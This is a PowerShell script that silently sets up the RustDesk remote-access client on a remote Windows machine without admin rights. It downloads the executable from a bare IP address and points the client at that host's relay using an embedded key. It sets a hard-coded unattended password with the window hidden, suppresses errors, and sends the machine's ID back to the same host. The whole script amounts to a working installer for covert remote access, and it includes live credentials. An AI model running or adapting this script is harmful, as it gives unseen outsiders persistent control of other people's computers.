# rd_boot.ps1 — portable RustDesk bootstrap on the remote (NO admin / no UAC).
# Downloads RustDesk from our 178 mirror, points it at our self-hosted server
# (relay+key), sets the permanent password, launches it (accepts incoming while
# running), then reports the ID back to us two independent ways:
#   1) it registers to our hbbs on 178  -> we read newest peer from db_v2.sqlite3
#   2) it pings http://178/rdid/<id>    -> we grep nginx access.log
# Everything is best-effort; the app launching + registering is what matters.
$ErrorActionPreference = 'SilentlyContinue'
$mir = 'http://178.253.55.128'
$exe = Join-Path $env:TEMP 'rustdesk.exe'
$log = Join-Path $env:TEMP 'rd_boot.log'
function L($m){ ("[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m) | Out-File -Append -Encoding utf8 $log }
L "start"

# 1) download portable exe
try {
  Invoke-WebRequest "$mir/rustdesk-1.4.8-x86_64.exe" -OutFile $exe -UseBasicParsing -TimeoutSec 120
  L ("downloaded {0} bytes" -f (Get-Item $exe).Length)
} catch { L "download FAILED: $_" }

# 2) write config -> our self-hosted server + key (user/portable config path)
$cfgdir = Join-Path $env:APPDATA 'RustDesk\config'
New-Item -ItemType Directory -Force -Path $cfgdir | Out-Null
$toml = @"
rendezvous_server = '178.253.55.128:21116'
nat_type = 0
serial = 0

[options]
custom-rendezvous-server = '178.253.55.128'
relay-server = '178.253.55.128'
key = 'OS6FFMq66QzmnraQDy+cy+fdryWDXA0fBVZTbYqc7Lk='
"@
Set-Content -Path (Join-Path $cfgdir 'RustDesk2.toml') -Value $toml -Encoding UTF8
L "wrote RustDesk2.toml"

# 3) set the permanent (unattended) password
try { Start-Process -FilePath $exe -ArgumentList '--password','1KSOmnb1111@' -WindowStyle Hidden -Wait } catch { L "password set FAILED: $_" }
Start-Sleep -Seconds 2

# 4) launch the app (registers to our server, accepts incoming while running)
try { Start-Process -FilePath $exe -WindowStyle Minimized } catch { L "launch FAILED: $_" }
Start-Sleep -Seconds 6

# 5) best-effort: read our ID and phone it home so it lands in nginx access.log
$id = ''
try { $id = (& $exe --get-id 2>$null | Out-String).Trim() } catch {}
L "get-id => '$id'"
if ($id -match '^\d{6,}$') {
  try { Invoke-WebRequest "$mir/rdid/$id" -UseBasicParsing -TimeoutSec 5 } catch {}
}
try { Invoke-WebRequest "$mir/rdboot/done" -UseBasicParsing -TimeoutSec 5 } catch {}
"ID=$id" | Out-File -Encoding utf8 (Join-Path $env:TEMP 'rd_id.txt')
L "done id=$id"
